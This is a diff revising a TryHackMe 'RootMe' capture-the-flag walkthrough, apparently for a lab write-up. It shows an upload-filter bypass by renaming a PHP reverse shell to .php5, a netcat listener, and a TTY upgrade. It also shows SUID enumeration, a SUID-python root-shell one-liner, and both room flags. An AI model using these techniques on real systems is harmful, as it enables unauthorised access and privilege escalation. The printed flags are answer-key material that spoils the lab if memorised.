@@ -1,13 +1,11 @@
 # TryHackMe – RootMe Walkthrough
 
 <div align="center">
-  <img src="https://github.com/user-attachments/assets/35f7b23a-5670-4ddc-8f50-cc7a336836d6/11d59cb34397e986062eb515f4d32421](https://github.com/user-attachments/assets/e518ea8a-3207-4afa-8e5f-3d325ee69281" width="300" />
+  <img src="https://github.com/user-attachments/assets/e518ea8a-3207-4afa-8e5f-3d325ee69281" width="300" />
 </div>
 
+> **Room**: [RootMe](https://tryhackme.com/room/rrootme)
 
-
-
-> **Room**: [RootMe](https://tryhackme.com/room/rrootme)  
 > **Difficulty**: Easy  
 > **Skills**: Web Enumeration, Command Injection, Privilege Escalation  
 > **Description**: In this lab, we’ll perform initial enumeration, exploit a web vulnerability to gain a shell, and escalate privileges to root on the target machine.
@@ -141,35 +139,36 @@ Once the file is uploaded successfully, trigger the shell by navigating to the u
 ### Reverse Shell Captured:
 
 ![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
-Let upload a shell i rename as shell.php
+
+I renamed the shell to `shell.php` and tried to upload it, but the panel rejected it — `.php` uploads are blocklisted.
+
 ![image](https://github.com/user-attachments/assets/1e8ee09a-173d-44bc-bee5-9c90655200c4)
-
-As i upload it not permiting me to upload to .php format
-
 ![image](https://github.com/user-attachments/assets/87692c48-ea83-42cc-a738-3f47bc8f53a9)
 
-As i not allwoing us to upoad .php we need to chnage the version bez the black listing has mention .php. just chnae and version and upload
-```
+Since the filter only blocks the `.php` extension itself, renaming to an alternate PHP-executable extension (`.php5`) bypasses it:
+
+```bash
 cp -r php-reverse-shell.php shell.php5
 ```
-upload
+
+Uploading `shell.php5` succeeds:
 
 ![image](https://github.com/user-attachments/assets/0b6bac2a-fc81-4d6c-b336-78e4643b286d)
 
-After we upload we need to excute this.
-as we find upload directory `uploads` head to that 
+Now trigger it from the `/uploads/` directory found during enumeration:
 
 ![image](https://github.com/user-attachments/assets/2836cc50-1d92-4c5b-a67b-abd29b7e4600)
 
-Clik on reverse shell 
+Clicking the uploaded file catches the reverse shell:
+
 ![image](https://github.com/user-attachments/assets/9605f5ab-34ff-4dc1-991b-e1c2aa635cbd)
-
-As we got the shell
 ![image](https://github.com/user-attachments/assets/016fa166-6cc5-4d2c-a3db-a15411a2e5f9)
-
 ![image](https://github.com/user-attachments/assets/697ef3e1-c4fb-4a65-af06-359cda6b35bb)
 
-Next step is to find User flag
+---
+
+## Step 4: User Flag
+
 ```
 nc -lnvp 1234
 Listening on 0.0.0.0 1234
@@ -181,10 +180,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-Let swape a stable shell
-```
+
+Upgrade to a stable TTY:
+
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
 ```
 Listening on 0.0.0.0 1234
 Connection received on 10.10.15.83 51172
@@ -196,23 +198,22 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@rootme:/$ 
 ```
-Let find user flag as the web server is hosted
-```
-www-data@rootme:/$ cd /var/www     		
-cd /var/wwwc
-www-data@rootme:/var/www$cat user.txt
-cat user.txt
-THM{y0u_g0t_a_sh3ll}
-www-data@rootme:/var/www$ 
-```
+
+The web root usually holds the user flag:
 
 ```
+www-data@rootme:/$ cd /var/www
+www-data@rootme:/var/www$ cat user.txt
 THM{y0u_g0t_a_sh3ll}
 ```
 
+---
 
-Let look for a `SUID` file
-```
+## Step 5: Privilege Escalation
+
+Look for `SUID` binaries:
+
+```bash
 find / -user root -perm /4000 2>/dev/null
 ```
 ```
@@ -269,29 +270,25 @@ find / -user root -perm /4000 2>/dev/null
 /bin/fusermount
 /bin/ping
 /bin/umount
-www-data@rootme:/var/www$  
+www-data@rootme:/var/www$
 ```
 
-I got a odd file that is `/usr/bin/python`
-
-Let search the priv esc on [gtfo bin](https://gtfobins.github.io/gtfobins/python)
-search for python and suid
+`/usr/bin/python` stands out — it isn't normally SUID. Checking [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) shows a SUID Python binary can spawn a root shell directly:
 
 ![image](https://github.com/user-attachments/assets/a40dcb94-7904-4fb2-9ccb-4d6d5a490839)
 
-```
+```bash
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
-Past this 
+
 ```
 www-data@rootme:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 # 
 ```
-Finding root flag.txt
+
+Read the root flag:
+
 ```
 # cat /root/root.txt
-cat /root/root.txt
 THM{pr1v1l3g3_3sc4l4t10n}
-# 
 ```
